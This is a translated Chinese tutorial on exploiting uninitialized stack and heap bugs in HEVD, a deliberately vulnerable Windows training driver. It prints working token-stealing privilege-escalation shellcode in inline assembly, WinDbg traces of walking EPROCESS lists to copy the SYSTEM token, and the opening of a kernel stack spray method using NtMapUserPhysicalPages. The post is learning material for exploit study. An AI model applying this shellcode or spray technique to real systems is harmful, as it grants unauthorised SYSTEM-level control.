# 【技术分享】HEVD Kernel Exploitation--Uninitialized Stack & Heap
|
##### 译文声明
本文是翻译文章，文章来源：whereisk0shl.top
原文地址：[http://whereisk0shl.top/hevd-kernel-exploitation-uninitialized-stack-&-heap.html](http://whereisk0shl.top/hevd-kernel-exploitation-uninitialized-stack-&-heap.html)
译文仅供参考，具体内容表达以及含义原文为准。
****
**0x00前言**
****
我是菜鸟，大牛们请喷T.T
HEVD是HackSys的一个Windows的训练项目，是一个存在漏洞的内核的驱动，里面存在多个漏洞，通过ControlCode控制漏洞类型，这个项目的驱动里几乎涵盖了内核可能存在的所有漏洞，从最基础的栈溢出，到池溢出，释放后重用等等类型，是一个非常好的项目。非常适合我们熟悉理解Windows内核漏洞的原理，利用技巧等等。
项目地址：
项目可以通过WDK的build方法直接编译，详细编译方法可以看《0day安全：软件漏洞分析技术》中内核漏洞章第一节内容有介绍，也可以百度直接搜到，通过build方法可以编译出对应版本的驱动.sys，然后通过osrloader工具注册并加载，之后就可以通过Demo来进行调试和提权了。
在这个项目中包含了两种漏洞类型，叫做Uninitialized Stack和Uninitialized
Heap，分别是未初始化的栈和未初始化的堆，具体的漏洞形成原因可以通过阅读HEVD项目的源码和说明了解。大致漏洞形成的原因就是在驱动没有对结构体进行初始化，从而导致可以通过提前覆盖内核堆栈的方法控制关键结构体，在没有进行初始化和结构体内容检查的情况下，直接引用结构体的函数指针，最后可以通过提前覆盖的方法控制结构题的函数指针，跳转到提权shellcode，来完成提权。
这篇文章的内容不再分析漏洞成因，成因都非常简单，我将就几方面内容和大家一起分享一下学习成果，第一部分将分享一下HEVD项目中通用的提权shellcode，第二部分将跟大家分享一下j00ru提出的利用NtMapUserPhysicalPages进行kernel
stack spray的方法，第三部分我将分享一下HEVD中的一个challenge，是关于未初始化堆空间利用的方法。
HEVD项目中，不仅提供了包含漏洞的驱动源码，还包含了对应利用的Exploit，但是在Uninitialized
Heap漏洞中提出了一个challenge。
下面我们一起来开始今天的学习之旅吧！
**0x01 privilege Escalation Shellcode**
关于提权的shellcode方法有很多，看过我之前对于CVE-2014-4113分析的小伙伴一定对替换token的这种方法比较熟悉，在我的那篇分析里，利用替换token这种shellcode是用C来实现的，当然，还有其他方法，比如将ACL置NULL这种方法，今天我还是给大家一起分享一下替换token这种方法，这种方法非常好用也非常常用，HEVD中替换shellcode的方法，是用内联汇编完成的。
    VOID TokenStealingPayloadWin7Generic() {
        // No Need of Kernel Recovery as we are not corrupting anything
        __asm {
            pushad                               ; Save registers state
            ; Start of Token Stealing Stub
            xor eax, eax                         ; Set ZERO
            mov eax, fs:[eax + KTHREAD_OFFSET]   ; Get nt!_KPCR.PcrbData.CurrentThread
                                                 ; _KTHREAD is located at FS:[0x124]
            mov eax, [eax + EPROCESS_OFFSET]     ; Get nt!_KTHREAD.ApcState.Process
            mov ecx, eax                         ; Copy current process _EPROCESS structure
            mov edx, SYSTEM_PID                  ; WIN 7 SP1 SYSTEM process PID = 0x4
            SearchSystemPID:
                mov eax, [eax + FLINK_OFFSET]    ; Get nt!_EPROCESS.ActiveProcessLinks.Flink
                sub eax, FLINK_OFFSET
                cmp [eax + PID_OFFSET], edx      ; Get nt!_EPROCESS.UniqueProcessId
                jne SearchSystemPID
            mov edx, [eax + TOKEN_OFFSET]        ; Get SYSTEM process nt!_EPROCESS.Token
            mov [ecx + TOKEN_OFFSET], edx        ; Replace target process nt!_EPROCESS.Token
                                                 ; with SYSTEM process nt!_EPROCESS.Token
            ; End of Token Stealing Stub
            popad                                ; Restore registers state
        }
    }
这种方法，首先会通过fs段寄存器获取_KTHREAD结构题，fs段寄存器存放了关于线程的各种信息，当处于内核态时，fs的值为0x30，处于用户态时fs值则为0x3b。
    kd> p
    01352782 57              push    edi
    kd> p
    01352783 60              pushad
    kd> p
    01352784 33c0            xor     eax,eax
    kd> p
    01352786 648b8024010000  mov     eax,dword ptr fs:[eax+124h]
    kd> dd 0030:00000124
    0030:00000124  859615c0
随后获取到KTHREAD之后，我们可以获取到EPROCESS结构，这个结构中包含了PID等信息，最为关键的是，在内核中是以链表存放的，而这个链表就在_EPROCESS结构中。
    kd> dd 859615c0+50
    85961610  85a5e538 09000000 00000000 00000000
    85961620  00000000 00000037 01000002 00000000
    85961630  85961680 82936088 82936088 00000000
    85961640  002e5ef3 00000000 7ffdd000 00000000
    85961650  006a0008 00000000 859616c8 859616c8
    85961660  6751178a 0000006e 00000000 00000000
    85961670  00000000 00000000 00000060 82972b00
    85961680  859617fc 859617fc 859615c0 843b0690
    kd> dt _EPROCESS 85a5e538
    ntdll!_EPROCESS
       +0x000 Pcb              : _KPROCESS
       +0x098 ProcessLock      : _EX_PUSH_LOCK
       +0x0a0 CreateTime       : _LARGE_INTEGER 0x1d27c2c`295b0eb9
       +0x0a8 ExitTime         : _LARGE_INTEGER 0x0
       +0x0b0 RundownProtect   : _EX_RUNDOWN_REF
       +0x0b4 UniqueProcessId  : 0x00000c64 Void
       +0x0b8 ActiveProcessLinks : _LIST_ENTRY [ 0x8294a4f0 - 0x843d76a0 ]
一旦获取了EPROCESS结构，我们能做很多事情，最简单的，观察偏移0xb4位置，存放着当前进程的PID，而0xb8位置，存放着一个LIST_ENTRY结构，这个结构存放着前面一个EPROCESS和后一个EPROCESS，这就很有意思了。
我可以通过这种方法，遍历当前系统所有存在的EPROCESS，而且能够找到System的EPROCESS，实际上，这个_EPROCESS，我们通过Windbg的!process
0 0的方法可以获取到。
    kd> dt _LIST_ENTRY 841bdad0+b8
    urlmon!_LIST_ENTRY
     [ 0x84e64290 - 0x8294a4f0 ]
       +0x000 Flink            : 0x84e64290 _LIST_ENTRY [ 0x854670e8 - 0x841bdb88 ]
       +0x004 Blink            : 0x8294a4f0 _LIST_ENTRY [ 0x841bdb88 - 0x85a5e5f0 ]
    kd> dd 841bdad0+b8
    841bdb88  84e64290 8294a4f0 00000000 00000000
    841bdb98  00000000 00000000 0000000d 8293db40
    841bdba8  00000000 00644000 00246000 00000000
    841bdbb8  00000000 00000000 00000000 87a01be8
    841bdbc8  87a0130b 00000000 00000000 00000000
    841bdbd8  00000000 00000000 841de2e0 00000000
    841bdbe8  00000005 00000040 00000000 00000000
    841bdbf8  00000000 00000000 00000000 00000000
    kd> dt _EPROCESS 84e64290-b8
    ntdll!_EPROCESS
       +0x000 Pcb              : _KPROCESS
       +0x098 ProcessLock      : _EX_PUSH_LOCK
       +0x0a0 CreateTime       : _LARGE_INTEGER 0x1d27bbd`9fafafa2
       +0x0a8 ExitTime         : _LARGE_INTEGER 0x0
       +0x0b0 RundownProtect   : _EX_RUNDOWN_REF
       +0x0b4 UniqueProcessId  : 0x00000100 Void
       +0x0b8 ActiveProcessLinks : _LIST_ENTRY [ 0x854670e8 - 0x841bdb88 ]
回到shellcode，后面有一个loop循环，在循环中做的事情就是不断通过链表的前向指针和后向指针找到System的_EPROCESS结构，也就是＋0xb4位置的PID为4的结构，在结构中存放着token，只要找到System的token，替换掉当前进程的token，就可以完成提权了。
**0x02 NtMapUserPhysicalPages and Kernel Stack Spray**
在下面的调试中，由于我多次重新跟踪调试，所以每次申请的shellcode指针地址都不太一样，但不影响理解。  
在HEVD项目中涉及到一种方法，可以进行Kernel Stack
Spray，其实在内核漏洞中，未初始化的堆栈这种漏洞相对少，而且在Windows系统中内核堆栈不像用户态的堆栈，是共用的一片空间，因此如果使用Kernel
Stack Spray是有一定风险的，比如可能覆盖到某些其他的API指针。在作者博客中也提到这种Kernel Stack
Spray是一种比较冷门的方法，但也比较有意思。这里我就和大家一起分析一下，利用NtMapUserPhysicalPages这个API完成内核栈喷射的过程。
为什么要用NtMapUserPhysicalPages，别忘了我们执行提权Exploit的时候，是处于用户态，在用户态时使用的栈地址是用户栈，如果我们想在用户态操作内核栈，可以用这个函数在用户态来完成对内核栈的控制。
j00ru博客对应内容文章地址：
首先我们触发的是Uninitialized
Stack这个漏洞，在触发之前，我们需要对内核栈进行喷射，这样可以将shellcode函数指针覆盖到HEVD.sys的结构体中。用到的就是NtMapUserPhysicalPages这个方法。
这个方法存在于ntkrnlpa.exe中，也就是nt!NtMapUserPhysicalPages，首先到达这个函数调用的时候，进入内核态，我们可以通过cs段寄存器来判断，一般cs为0x8时处于内核态，为0x1b时处于用户态。
    kd> r cs
    cs=00000008